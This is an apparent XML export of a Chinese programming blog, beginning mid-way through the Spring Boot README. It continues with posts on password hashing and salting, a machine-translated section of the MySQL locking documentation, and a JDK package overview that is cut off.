org.springframework.boot.autoconfigure.*;import org.springframework.web.bind.annotation.*;@RestController@SpringBootApplicationpublic class Example &#123; @RequestMapping(&quot;/&quot;) String home() &#123; return &quot;Hello World!&quot;; &#125; public static void main(String[] args) throws Exception &#123; SpringApplication.run(Example.class, args); &#125;&#125; == Getting helpHaving trouble with Spring Boot? We’d like to help! Check the {docs}/htmlsingle/[reference documentation], especially the{docs}/htmlsingle/#howto[How-to’s] – they provide solutions to the most commonquestions. Learn the Spring basics – Spring Boot builds on many other Spring projects, checkthe https://spring.io[spring.io] web-site for a wealth of reference documentation. Ifyou are just starting out with Spring, try one of the https://spring.io/guides[guides]. If you are upgrading, read the https://github.com/spring-projects/spring-boot/wiki[release notes]for upgrade instructions and “new and noteworthy” features. Ask a question - we monitor https://stackoverflow.com[stackoverflow.com] for questionstagged with https://stackoverflow.com/tags/spring-boot[`spring-boot`]. You can also chatwith the community on https://gitter.im/spring-projects/spring-boot[Gitter]. Report bugs with Spring Boot at https://github.com/spring-projects/spring-boot/issues[github.com/spring-projects/spring-boot/issues]. == Reporting IssuesSpring Boot uses GitHub’s integrated issue tracking system to record bugs and featurerequests. If you want to raise an issue, please follow the recommendations below: Before you log a bug, please https://github.com/spring-projects/spring-boot/search?type=Issues[search the issue tracker]to see if someone has already reported the problem. If the issue doesn’t already exist, https://github.com/spring-projects/spring-boot/issues/new[create a new issue]. Please provide as much information as possible with the issue report, we like to knowthe version of Spring Boot that you are using, as well as your Operating System andJVM version. If you need to paste code, or include a stack trace use Markdown +++ +++ escapesbefore and after your text. If possible try to create a test-case or project that replicates the issue. You cansubmit sample projects as pull-requests against thehttps://github.com/spring-projects/spring-boot-issues[spring-boot-issues] GitHubproject. Use the issue number for the name of your project. == Building from SourceYou don’t need to build from source to use Spring Boot (binaries inhttps://repo.spring.io[repo.spring.io]), but if you want to try out the latest andgreatest, Spring Boot can be easily built with thehttps://github.com/takari/maven-wrapper[maven wrapper]. You also need JDK 1.8. [indent=0]$ ./mvnw clean install If you want to build with the regular mvn command, you will needhttps://maven.apache.org/run-maven/index.html[Maven v3.5.0 or above]. NOTE: You may need to increase the amount of memory available to Maven by settinga MAVEN_OPTS environment variable with the value -Xmx512m. Rememberto set the corresponding property in your IDE as well if you are building and runningtests there (e.g. in Eclipse go to Preferences-&gt;Java-&gt;Installed JREs and edit theJRE definition so that all processes are launched with those arguments). This propertyis automatically set if you use the maven wrapper. _Also see link:CONTRIBUTING.adoc[CONTRIBUTING.adoc] if you wish to submit pull requests,and in particular please fill out thehttps://support.springsource.com/spring_committer_signup[Contributor&#39;s Agreement]before your first change, however trivial._ === Building reference documentation First of all, make sure you have built the project: [indent=0]$ ./mvnw clean install The reference documentation requires the documentation of the Maven plugin to beavailable so you need to build that first since it’s not generated by default. [indent=0]$ ./mvnw clean install -pl spring-boot-project/spring-boot-tools/spring-boot-maven-plugin -Pdefault,full The documentation also includes auto-generated information about the starters. You mighthave that in your local repository already (per the first step) but if you want to refreshit: [indent=0]$ ./mvnw clean install -f spring-boot-project/spring-boot-starters Once this is done, you can build the reference documentation with the command below: [indent=0]$ ./mvnw clean prepare-package -pl spring-boot-project/spring-boot-docs -Pdefault,full TIP: The generated documentation is available from spring-boot-project/spring-boot-docs/target/contents/reference == ModulesThere are a number of modules in Spring Boot, here is a quick overview: === spring-bootThe main library providing features that support the other parts of Spring Boot,these include: The SpringApplication class, providing static convenience methods that make it easyto write a stand-alone Spring Application. Its sole job is to create and refresh anappropriate Spring ApplicationContext Embedded web applications with a choice of container (Tomcat, Jetty or Undertow) First class externalized configuration support Convenience ApplicationContext initializers, including support for sensible loggingdefaults === spring-boot-autoconfigureSpring Boot can configure large parts of common applications based on the contentof their classpath. A single @EnableAutoConfiguration annotation triggersauto-configuration of the Spring context. Auto-configuration attempts to deduce which beans a user might need. For example, ifHSQLDB is on the classpath, and the user has not configured any database connections,then they probably want an in-memory database to be defined. Auto-configuration willalways back away as the user starts to define their own beans. === spring-boot-startersStarters are a set of convenient dependency descriptors that you can include inyour application. You get a one-stop-shop for all the Spring and related technologythat you need without having to hunt through sample code and copy paste loads ofdependency descriptors. For example, if you want to get started using Spring and JPA fordatabase access just include the spring-boot-starter-data-jpa dependency in yourproject, and you are good to go. === spring-boot-cliThe Spring command line application compiles and runs Groovy source, making it supereasy to write the absolute minimum of code to get an application running. Spring CLIcan also watch files, automatically recompiling and restarting when they change. === spring-boot-actuatorActuator endpoints let you monitor and interact with your application.Spring Boot Actuator provides the infrastructure required for actuator endpoints. It containsannotation support for actuator endpoints. Out of the box, this module provides a number of endpointsincluding the HealthEndpoint, EnvironmentEndpoint, BeansEndpoints and many more. === spring-boot-actuator-autoconfigureThis provides auto-configuration for actuator endpoints based on the content of the classpath and a set of properties.For instance, if Micrometer is on the classpath, it will auto-configure the MetricsEndpoint.It contains configuration to expose endpoints over HTTP or JMX.Just like Spring Boot AutoConfigure, this will back away as the user starts to define their own beans. === spring-boot-testThis module contains core items and annotations that can be helpful when testing your application. === spring-boot-test-autoconfigureLike other Spring Boot auto-configuration modules, spring-boot-test-autoconfigure, provides auto-configurationfor tests based on the classpath. It includes a number of annotations that can be used to automaticallyconfigure a slice of your application that needs to be tested. === spring-boot-loaderSpring Boot Loader provides the secret sauce that allows you to build a single jar filethat can be launched using java -jar. Generally you will not need to usespring-boot-loader directly, but instead work with thelink:spring-boot-project/spring-boot-tools/spring-boot-gradle-plugin[Gradle] orlink:spring-boot-project/spring-boot-tools/spring-boot-maven-plugin[Maven] plugin. === spring-boot-devtoolsThe spring-boot-devtools module provides additional development-time features such as automatic restarts,for a smoother application development experience. Developer tools are automatically disabled whenrunning a fully packaged application. == SamplesGroovy samples for use with the command line application are available inlink:spring-boot-project/spring-boot-cli/samples[spring-boot-cli/samples]. To run the CLI samples typespring run &lt;sample&gt;.groovy from samples directory. Java samples are available in link:spring-boot-samples[spring-boot-samples] and shouldbe built with maven and run by invoking java -jar target/&lt;sample&gt;.jar. == GuidesThe https://spring.io/[spring.io] site contains several guides that show how to use SpringBoot step-by-step: https://spring.io/guides/gs/spring-boot/[Building an Application with Spring Boot] is avery basic guide that shows you how to create a simple application, run it and add somemanagement services. https://spring.io/guides/gs/actuator-service/[Building a RESTful Web Service with SpringBoot Actuator] is a guide to creating a REST web service and also shows how the servercan be configured. https://spring.io/guides/gs/convert-jar-to-war/[Converting a Spring Boot JAR Applicationto a WAR] shows you how to run applications in a web server as a WAR file. == LicenseSpring Boot is Open Source software released under thehttp://www.apache.org/licenses/LICENSE-2.0.html[Apache 2.0 license].]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码加密方式]]></title>
    <url>%2F2018%2F03%2F24%2Fencryption%2Fpassword-develop%2F</url>
    <content type="text"><![CDATA[常见攻击方式：字典攻击：早期base64+md5 破解方式–把常见密码进行base63+md5加密 通过重复登陆服务器 或者拖库进行匹配破解【破解方式属于开放状态】 对称加密 加密解密效率高、速度快、空间占用小、加密强度高 缺点是 参与多方都需要持有密钥、一旦有一个人泄露则安全性遭到破坏、另外再不容安全通道下分发密钥也是个问题 代表算法：DES、3DES、AES、IDEA等等 DES：其密钥长度为56位+8位校验 破解方式：暴力破解 3DES：3重DES操作 算法不能靠累积增加防御力 AES：分组算法、分组长度为128、192、256位三种、其优势在于 速度快 整个过程可以数学化描述、目前尚未有效破解手段 适用于大量数据加解密、不能用于签名场景 需要提前分法密钥 非对称加密 即公钥+私钥 公钥是公开的、私钥是个人持有的 代表算法：RSA、EIGamal、椭圆算法 ECC RSA：经典的公钥算法 安全性未知 EIGamal：利用了模运算下求离散对数困难的特性 椭圆曲线算法：现代备受关注的算法系列，基于对椭圆曲线上特定点进行特殊乘法逆运算难以计算的特性。 RSA 算法等已被认为不够安全，一般推荐采用椭圆曲线系列算法。 混合加密机制 先用计算复杂度高的非对称加密协商一个临时的对称加密密钥（会话密钥，一般相对内容来说要短得多），然后对方在通过对称加密对传递的大量数据进行加解密处理。 典型应用：现在大家常用的HTTPS机制、 HTTPS实际上是利用了Transport Layer Security/Secure Socket Layer（TLS/SSL）来实现可靠性传输、TLS为SSL升级版本 目前广泛应用的为 TLS1.0 对应到SSL3.1 版本 建立安全连接的具体步骤如下： 客户端浏览器发送信息到服务器，包括随机数 R1，支持的加密算法类型、协议版本、压缩算法等。注意该过程为明文。 服务端返回信息，包括随机数 R2、选定加密算法类型、协议版本，以及服务器证书。注意该过程为明文。 浏览器检查带有该网站公钥的证书。该证书需要由第三方 CA 来签发，浏览器和操作系统会预置权威 CA 的根证书。如果证书被篡改作假（中间人攻击），很容易通过 CA 的证书验证出来。 如果证书没问题，则用证书中公钥加密随机数 R3，发送给服务器。此时，只有客户端和服务器都拥有 R1、R2 和 R3 信息，基于 R1、R2 和 R3，生成对称的会话密钥（如 AES算法）。后续通信都通过对称加密进行保护。 最简单的哈希加密 例如SHA256，SHA512，RipeMD和WHIRLPOOL。 hash(“hello”) = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824 破解方式：字典攻击 、暴力攻击加密算法公开 将常见密码哈希之后与目标进行比对 暴力攻击尝试每一个在给定长度下各种字符的组合 彩虹表枚举哈希值-来更高效的破解密码 加盐方式 加盐需要注意两点：短盐值、盐值重复 两大弊端：盐值重复或者硬编到软件中、可以通过破解软件、专门为这个软件生成彩虹表和查询表 盐值太短：就相当于降低密码复杂度、这使得破解字典体积更小、跑字典破解更快 组合哈希函数 md5(sha1(password)) md5(md5(salt) + md5(password)) sha1(sha1(password)) sha1(str_rot13(password + salt)) md5(sha1(md5(md5(password) + sha1(password)) + md5(password))) 源码一丢、系统完蛋 盐值应该使用基于加密的伪随机数生成器（Cryptographically Secure Pseudo-Random Number Generator – CSPRNG）来生成java.security.SecureRandom 存储密码的步骤 使用CSPRNG生成一个长度足够的盐值 将盐值混入密码，并使用标准的加密哈希函数进行加密，如SHA256把哈希值和盐值一起存入数据库中对应此用户的那条记录 校验密码的步骤 从数据库取出用户的密码哈希值和对应盐值将盐值混入用户输入的密码，并且使用同样的哈希函数进行加密比较上一步的结果和数据库储存的哈希值是否相同，如果相同那么密码正确，反之密码错误 在Web程序中，永远在服务器端进行哈希加密 让密码更难破解：慢哈希函数 PBKDF2、BCRYPT、SCRYPT曾经是最常用的三种密码Hash算法， 至于哪种算法最好，多年以来密码学家们并无定论。但可以确定的是，这三种算法都不完美，各有缺点。 其中 PBKDF2因为计算过程需要内存少所以可被GPU/ASIC加速， BCRYPT不支持内存占用调整且容易被FPGA加速， SCRYPT不支持单独调整内存或计算时间占用且可能被ASIC加速并有被旁路攻击的可能。 关于密码学的另一篇文章http://www.qingruanit.net/blog/23930/note3641.html PBKDF2算法【三种】介绍： https://en.wikipedia.org/wiki/PBKDF2 http://blog.jobbole.com/61872/#java http://blog.csdn.net/u014375869/article/details/46773995]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【锁优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-lock%2F</url>
    <content type="text"><![CDATA[MySQL使用锁管理对表内容的争用 ： 内部锁定在MySQL服务器内部执行，以管理多个线程对表内容的争用。这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。参见 第8.11.1节“内部锁定方法”。 当服务器和其他程序锁定MyISAM表文件以相互协调哪个程序可以访问表时，发生外部锁定。参见第8.11.5节“外部锁定”。 8.11.1内部锁定方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144本节讨论内部锁定; 即在MySQL服务器本身内执行锁定以管理多个会话对表内容的争用。这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。对于其他程序在MySQL文件上执行的锁定，请参见第8.11.5节“外部锁定”。行级锁定表级锁定选择锁定类型行级锁定MySQL使用行级锁定为InnoDB表，以支持由多个会话并发写入权限，使其适用于多用户，高并发，和OLTP应用程序。为了避免在单个表上执行多个并发写入操作时发生死锁， InnoDB通过SELECT ... FOR UPDATE为每组预计要修改的行发布语句，即使数据更改语句稍后在事务中发生，也可以在事务启动时获取必要的锁。如果交易修改或锁定多个表，请在每个交易中以相同的顺序发布适用的报表。死锁会影响性能而不是表示严重的错误，因为它会 InnoDB自动 检测 死锁条件并回滚其中一个受影响的事务。在高并发系统上，当大量线程等待相同的锁时，死锁检测会导致速度下降。有时候，innodb_lock_wait_timeout 当死锁发生时，禁用死锁检测并依赖事务回滚的设置可能更有效 。使用innodb_deadlock_detect 配置选项可以禁用死锁检测 。行级锁定的优点：当不同的会话访问不同的行时，更少的锁冲突。回滚更少。可能长时间锁定一行。表级锁定MySQL使用表级锁的MyISAM， MEMORY和MERGE 表，只允许一个会话更新一次这些表。这种锁定级别使得这些存储引擎更适合于只读，主要读取或单用户应用程序。这些存储引擎通过始终在查询开始时一次请求所有需要的锁，并始终以相同的顺序锁定表来避免 死锁。权衡是这种策略降低了并发性; 其他要修改表的会话必须等到当前数据更改语句结束。表级锁定的优点：所需的内存相对较少（行锁定需要锁定每行或一组行的内存）在大部分表格上使用时都很快，因为只涉及一个锁。如果您经常GROUP BY 对大部分数据执行操作，或者必须频繁扫描整个表，则速度很快。MySQL授予表写入锁定如下：如果表上没有锁，请在其上写入锁。否则，将锁定请求放入写入锁定队列中。MySQL授予表读取锁定如下：如果表上没有写入锁，请在其上放置一个读取锁。否则，将锁定请求放入读锁定队列中。表格更新优先于表格检索。因此，当释放一个锁时，该锁可用于写入锁定队列中的请求，然后可用于读取锁定队列中的请求。这确保了即使桌子上有大量活动时，表格的更新也不会“ 饿死 ”SELECT。但是，如果有多个表的更新，则 SELECT语句会等待，直到没有更新。有关更改读取和写入优先级的信息，请参见第8.11.2节“表锁定问题”。您可以通过检查Table_locks_immediate和 Table_locks_waited状态变量来分析系统上的表锁争用 ，这些变量分别表示可以立即授予表锁请求的次数和需要等待的数量：MySQL的&gt; SHOW STATUS LIKE &apos;Table%&apos;;+ ----------------------- + --------- +| 变量名| 值|+ ----------------------- + --------- +| Table_locks_immediate | 1151552 || Table_locks_waited | 15324 |+ ----------------------- + --------- +性能模式锁定表还提供锁定信息。请参见 第25.11.12节“性能架构锁表”。该MyISAM存储引擎支持并发插入，减少读者和作者之间的竞争给定表：如果一个MyISAM 表有数据文件的中间没有空闲块，行总是在数据文件的末尾插入。在这种情况下，您可以自由地将一个表的并发INSERT和SELECT语句 混合使用 ， MyISAM而无需锁定。也就是说，你可以插入行到一个MyISAM表同时其他客户正在阅读它。在表中间删除或更新的行可能会产生空洞。如果存在孔，则同时插入将被禁用，但当所有孔已填充新数据时将自动再次启用插入。要控制此行为，请使用 concurrent_insert系统变量。请参见第8.11.3节“并发插入”。如果您显式获取表锁 LOCK TABLES，您可以请求 READ LOCAL锁而不是 READ锁，以使其他会话在表锁定的情况下执行并发插入。执行许多INSERT和 SELECT操作上的表 t1时并发的插入是不可能的，你可以插入行到一个临时表 temp_t1，并从临时表中的行更新真正的表：mysql&gt; LOCK TABLES t1 WRITE, temp_t1 WRITE;mysql&gt; INSERT INTO t1 SELECT * FROM temp_t1;mysql&gt; DELETE FROM temp_t1;mysql&gt;UNLOCK TABLES;选择锁定类型通常，在以下情况下，表锁优于行级锁：该表的大多数语句都是读取。该表的声明是读取和写入的混合，其中写入是对单个行的更新或删除，可以通过读取一个密钥来读取：UPDATE tbl_nameSET column= valueWHERE unique_key_col= key_value;DELETE FROM tbl_nameWHERE unique_key_col= key_value;SELECT结合并发INSERT 语句，并且很少 UPDATE或者 DELETE语句。许多扫描或GROUP BY整个表上的操作，没有任何作家。对于更高级别的锁定，您可以通过支持不同类型的锁定来更轻松地调整应用程序，因为锁定开销低于行级锁定。行级锁定以外的选项：版本控制（例如在MySQL中用于并发插入的版本），可以在多个读者的同一时间拥有一个作者。这意味着根据访问何时开始，数据库或表支持不同数据视图。这个其他常见的术语是 “ 时间旅行， ” “ 上写副本， ” 或“ 按需复制。”在许多情况下，按需复制优于行级锁定。但是，在最坏的情况下，它可以使用比使用普通锁更多的内存。而不是使用行级锁，你可以使用应用程序级锁，如提供的 GET_LOCK()和 RELEASE_LOCK()在MySQL。这些是咨询锁，因此它们只能与相互合作的应用程序一起工作。参见 第12.20节“其他功能”。 8.11.2表锁定问题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677InnoDB表使用行级锁定，以便多个会话和应用程序可以同时读取和写入同一个表，而不会让对方等待或产生不一致的结果。对于这个存储引擎，避免使用该LOCK TABLES语句，因为它没有提供任何额外的保护，而是降低了并发性。自动行级锁定使得这些表适合于最繁忙的数据库以及最重要的数据，同时还可以简化应用程序逻辑，因为您不需要锁定和解锁表。因此， InnoDB存储引擎是MySQL中的默认设置。MySQL除了为所有存储引擎使用表锁（而不是页锁，行锁或列锁） InnoDB。锁定操作本身没有太多的开销。但是因为只有一个会话可以同时写入一个表，为了获得这些其他存储引擎的最佳性能，请将它们主要用于经常查询且很少插入或更新的表。性能考虑因素支持InnoDB锁定性能问题的解决方法性能考虑因素支持InnoDB在选择是使用InnoDB或不同的存储引擎创建表时 ，请记住表锁定的以下缺点：表锁定使许多会话可以同时从表中读取数据，但是如果会话要写入表中，它必须首先获得独占访问权，这意味着它可能必须先等待其他会话完成表。在更新期间，想要访问此特定表的所有其他会话必须等到更新完成。当会话正在等待时，表锁定会导致问题，因为磁盘已满并且在会话可继续之前需要有空闲空间。在这种情况下，所有希望访问问题表的会话也会处于等待状态，直到有更多磁盘空间可用。一个SELECT是需要长时间运行的语句防止其他会话更新表的同时，使其他场次出现缓慢或无响应。虽然会话正在等待独占访问表以进行更新，但发出SELECT语句的其他会话 将排在其后面，即使对于只读会话也会降低并发性。锁定性能问题的解决方法以下各项介绍了一些避免或减少表锁定引起的争用的方法：考虑将表切换到 InnoDB存储引擎，或者 CREATE TABLE ... ENGINE=INNODB在安装期间使用，或者使用ALTER TABLE ... ENGINE=INNODB现有的表。有关此存储引擎的更多详细信息，请参见 第14章，InnoDB存储引擎。优化SELECT语句以加快运行速度，以便锁定表的时间更短。您可能需要创建一些汇总表来执行此操作。启动mysqld的使用 --low-priority-updates。对于仅使用表级锁（如存储引擎 MyISAM，MEMORY和 MERGE），这给所有的语句更新（修改），比表低优先级 SELECT的语句。在这种情况下，SELECT 前面的场景中的第二个语句将在UPDATE语句之前执行，并且不会等待第一个语句 SELECT完成。要指定在特定连接中发出的所有更新应该以低优先级完成，请将low_priority_updates 服务器系统变量设置 为1。要给出特定的INSERT， UPDATE或 DELETE语句较低的优先级，请使用该LOW_PRIORITY 属性。要给出特定的SELECT 声明更高的优先级，请使用该 HIGH_PRIORITY属性。请参见 第13.2.9节“SELECT语法”。以 系统变量的较低值 启动mysqld， max_write_lock_count以强制MySQL临时提升SELECT 在发生特定数量的表插入后等待表的所有语句的优先级。这允许 READ在一定数量的锁定之后进行 WRITE锁定。如果你有问题 INSERT联合 SELECT，可考虑改用MyISAM表，它支持并发SELECT和 INSERT报表。（参见 第8.11.3节“并发插入”）。如果你有问题，混合 SELECT和 DELETE报表，该 LIMIT选项 DELETE可能会有帮助。请参见 第13.2.2节“删除语法”。使用SQL_BUFFER_RESULTwith SELECT语句可以帮助缩短表锁的持续时间。请参见 第13.2.9节“SELECT语法”。通过允许查询针对一个表中的列运行，而将更新限制在不同表中的列中，将表内容拆分为单独的表格可能会有所帮助。您可以将锁定代码更改 mysys/thr_lock.c为使用单个队列。在这种情况下，写入锁和读取锁具有相同的优先级，这可能有助于某些应用程序。 8.11.3并发插入1234567891011121314151617181920212223242526272829该MyISAM存储引擎支持并发插入，减少读者和作者之间的竞争给定表：如果一个MyISAM表已经在数据文件中没有孔（中删除的行），一个 INSERT语句可以执行行添加到表的末尾同时 SELECT语句正在读取表格中的行。如果有多个 INSERT语句，它们将按照顺序排列并执行，并与SELECT语句同时执行 。并发的结果INSERT可能不会立即显示。所述concurrent_insert系统变量可以被设置为修改并发插入处理。默认情况下，该变量设置为AUTO（或1），并按前面所述处理并发插入。如果 concurrent_insert设置为 NEVER（或0），则禁用并发插入。如果变量设置为ALWAYS （或2），即使对于已删除行的表，也允许在表的末尾进行并发插入。另请参阅concurrent_insert系统变量的说明。如果您正在使用二进制日志，并发插入将转换为正常的插入CREATE ... SELECT或 INSERT ... SELECT语句。这样做是为了确保您可以通过在备份操作期间应用日志来重新创建表的精确副本。请参见第5.4.4节“二进制日志”。另外，对于这些语句，在选定表上放置一个读锁，以便阻止插入到该表中。结果是该表的并发插入必须等待。有了LOAD DATA INFILE，如果你指定CONCURRENT 一个MyISAM满足并发插入的状态表（即，它包含在中间没有空闲块），其他会话可以从表中检索数据时LOAD DATA正在执行。即使没有其他会话同时使用该表，该CONCURRENT选项的使用LOAD DATA也会影响一个位的性能。如果指定HIGH_PRIORITY，则会覆盖该--low-priority-updates选项的效果（ 如果服务器是使用该选项启动的）。这也会导致并发插入不被使用。为LOCK TABLE，之间的差READ LOCAL并且READ是 READ LOCAL允许非冲突性的 INSERT语句（并发插入），而锁被保持来执行。但是，如果要在持有锁的同时使用服务器外部的进程来操作数据库，则无法使用此功能。 8.11.4元数据锁定123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103MySQL使用元数据锁定来管理对数据库对象的并发访问并确保数据一致性。元数据锁定不仅适用于表格，还适用于架构，存储的程序（过程，函数，触发器和预定事件）以及表空间。元数据锁定确实涉及一些开销，随着查询量的增加而增加。元数据争用增加了多个查询尝试访问相同对象的次数越多。元数据锁定不是表格定义缓存的替代，其互斥锁和锁定与互斥锁不同 LOCK_open。以下讨论提供了有关元数据锁定工作原理的一些信息。为确保事务可序列化，服务器不得允许一个会话在另一个会话中未完成显式或隐式启动事务中使用的表上执行数据定义语言（DDL）语句。服务器通过获取事务内使用的表上的元数据锁，并推迟释放这些锁，直到事务结束为止。表上的元数据锁可以防止对表的结构进行更改。这种锁定方式意味着一个会话中的事务正在使用的表不能在其他会话中用于DDL语句，直到事务结束。这个原则不仅适用于事务表，也适用于非事务表。假设一个会话开始一个使用事务表t 和非事务表的事务nt，如下所示：开始交易;SELECT * FROM t;SELECT * FROM nt;服务器在两端都保存了元数据锁t， nt直到事务结束。如果另一个会话尝试对任一表执行DDL或写入锁定操作，则会阻塞，直到事务结束时释放元数据锁。例如，如果第二个会话尝试执行以下任何操作，则会阻止：DROP TABLE t;ALTER TABLE t ...;DROP TABLE nt;ALTER TABLE nt ...;LOCK TABLE t ... WRITE;The相同的行为适用于The LOCK TABLES ... READ。也就是说，更新任何表（事务性或非事务性）的显式或隐式启动事务将被阻塞并被LOCK TABLES ... READ该表阻塞。如果服务器为语句有效但在执行期间失败的语句获取元数据锁，则它不会提前释放锁。锁释放仍然延迟到事务结束，因为失败的语句被写入二进制日志，并且锁保护日志一致性。在自动提交模式下，每条语句实际上是一个完整的事务，因此为语句获取的元数据锁只保留在语句的末尾。在PREPARE准备好声明后，即使在多语句事务中进行准备，也会释放在声明中获取的元数据锁定 。8.11.5外部锁定外部锁定是使用文件系统锁定来管理MyISAM多个进程对数据库表的争用。外部锁定用于单个进程（如MySQL服务器）不能被认为是需要访问表的唯一进程的情况。这里有些例子：如果运行多个使用相同数据库目录的服务器（不推荐），则每台服务器都必须启用外部锁定。如果使用myisamchk在表上执行表维护操作 MyISAM，则必须确保服务器未运行，或者服务器启用了外部锁定，以便根据需要锁定表文件以与myisamchk协调 访问表。使用myisampack打包 MyISAM表格也是如此 。如果服务器在启用外部锁定的情况下运行，则可以随时使用myisamchk进行读取操作，例如检查表。在这种情况下，如果服务器尝试更新myisamchk正在使用的表， 服务器将在继续之前等待myisamchk完成。如果使用myisamchk进行写入操作（如修复或优化表），或者如果使用 myisampack打包表，则 必须始终确保 mysqld服务器不使用表。如果您不停止mysqld，至少 在运行myisamchk之前执行 mysqladmin flush-tables。如果服务器和 myisamchk同时访问表，您的表可能会损坏。在外部锁定生效的情况下，每个需要访问表的进程在继续访问表之前都会获取表文件的文件系统锁。如果无法获取所有必需的锁，则会阻止进程访问表，直到获得锁（在当前持有锁的进程释放它们之后）。外部锁定会影响服务器性能，因为服务器在访问表之前必须等待其他进程。如果您运行单个服务器来访问给定的数据目录（通常情况下），并且在服务器运行时没有其他程序（如myisamchk）需要修改表，则不需要外部锁定。如果只 使用其他程序读取表，则不需要外部锁定，但 如果服务器在myisamchk正在读取表格时更改表，myisamchk可能会报告警告 。在禁用外部锁定的情况下，要使用 myisamchk，必须在执行myisamchk时停止服务器，否则在运行myisamchk之前锁定并刷新表。（请参见第8.12.1节“系统因素”。）为避免此要求，请使用CHECK TABLE 和REPAIR TABLE语句来检查和修复MyISAM表格。对于mysqld，外部锁定由skip_external_locking系统变量的值控制 。当这个变量被启用时，外部锁定被禁用，反之亦然。外部锁定默认是禁用的。使用--external-locking或 --skip-external-locking 选项可以在服务器启动时控制使用外部锁定。如果确实使用外部锁定选项来启用对MyISAM来自多个MySQL进程的表的更新 ，则必须确保满足以下条件：不要将查询缓存用于使用另一个进程更新的表的查询。不要使用该--delay-key-write=ALL选项启动服务器，也不要 使用DELAY_KEY_WRITE=1任何共享表的表选项。否则，可能会发生索引损坏。满足这些条件的最简单方法是始终 --external-locking与--delay-key-write=OFF和 一起使用 --query-cache-size=0。（这不是默认完成的，因为在许多设置中，混合使用上述选项很有用。）]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jdk各个包 概述]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-total%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264java.applet 提供创建 applet 所必需的类和 applet 用来与其 applet 上下文通信的类。 java.awt 包含用于创建用户界面和绘制图形图像的所有类。 java.awt.color 提供用于颜色空间的类。 java.awt.datatransfer 提供在应用程序之间和在应用程序内部传输数据的接口和类。 java.awt.dnd Drag 和 Drop 是一种直接操作动作，在许多图形用户界面系统中都会遇到它，它提供了一种机制，能够在两个与 GUI 中显示元素逻辑相关的实体之间传输信息。 java.awt.event 提供处理由 AWT 组件所激发的各类事件的接口和类。 java.awt.font 提供与字体相关的类和接口。 java.awt.geom 提供用于在与二维几何形状相关的对象上定义和执行操作的 Java 2D 类。 java.awt.im 提供输入方法框架所需的类和接口。 java.awt.im.spi 提供启用可以与 Java 运行时环境一起使用的输入方法开发的接口。 java.awt.image 提供创建和修改图像的各种类。 java.awt.image.renderable 提供用于生成与呈现无关的图像的类和接口。 java.awt.print 为通用的打印 API 提供类和接口。 java.beans 包含与开发 beans 有关的类，即基于 JavaBeansTM 架构的组件。 java.beans.beancontext 提供与 bean 上下文有关的类和接口。 java.io 通过数据流、序列化和文件系统提供系统输入和输出。 java.lang 提供利用 Java 编程语言进行程序设计的基础类。 java.lang.annotation 为 Java 编程语言注释设施提供库支持。 java.lang.instrument 提供允许 Java 编程语言代理检测运行在 JVM 上的程序的服务。 java.lang.management 提供管理接口，用于监视和管理 Java 虚拟机以及 Java 虚拟机在其上运行的操作系统。 java.lang.ref 提供了引用对象类，支持在某种程度上与垃圾回收器之间的交互。 java.lang.reflect 提供类和接口，以获得关于类和对象的反射信息。 java.math 提供用于执行任意精度整数算法 (BigInteger) 和任意精度小数算法 (BigDecimal) 的类。 java.net 为实现网络应用程序提供类。 java.nio 定义作为数据容器的缓冲区，并提供其他 NIO 包的概述。 java.nio.channels 定义了各种通道，这些通道表示到能够执行 I/O 操作的实体（如文件和套接字）的连接；定义了用于多路复用的、非阻塞 I/O 操作的选择器。 java.nio.channels.spi 用于 java.nio.channels 包的服务提供者类。 java.nio.charset 定义用来在字节和 Unicode 字符之间转换的 charset、解码器和编码器。 java.nio.charset.spi java.nio.charset 包的服务提供者类。 java.rmi 提供 RMI 包。 java.rmi.activation 为 RMI 对象激活提供支持。 java.rmi.dgc 为 RMI 分布式垃圾回收提供了类和接口。 java.rmi.registry 提供 RMI 注册表的一个类和两个接口。 java.rmi.server 提供支持服务器端 RMI 的类和接口。 java.security 为安全框架提供类和接口。 java.security.acl 此包中的类和接口已经被 java.security 包中的类取代。 java.security.cert 提供用于解析和管理证书、证书撤消列表 (CRL) 和证书路径的类和接口。 java.security.interfaces 提供的接口用于生成 RSA Laboratory Technical Note PKCS#1 中定义的 RSA（Rivest、Shamir 和 Adleman AsymmetricCipher 算法）密钥，以及 NIST 的 FIPS-186 中定义的 DSA（数字签名算法）密钥。 java.security.spec 提供密钥规范和算法参数规范的类和接口。 java.sql 提供使用 JavaTM 编程语言访问并处理存储在数据源（通常是一个关系数据库）中的数据的 API。 java.text 提供以与自然语言无关的方式来处理文本、日期、数字和消息的类和接口。 java.text.spi java.text 包中类的服务提供者类。 java.util 包含 collection 框架、遗留的 collection 类、事件模型、日期和时间设施、国际化和各种实用工具类（字符串标记生成器、随机数生成器和位数组）。 java.util.concurrent 在并发编程中很常用的实用工具类。 java.util.concurrent.atomic 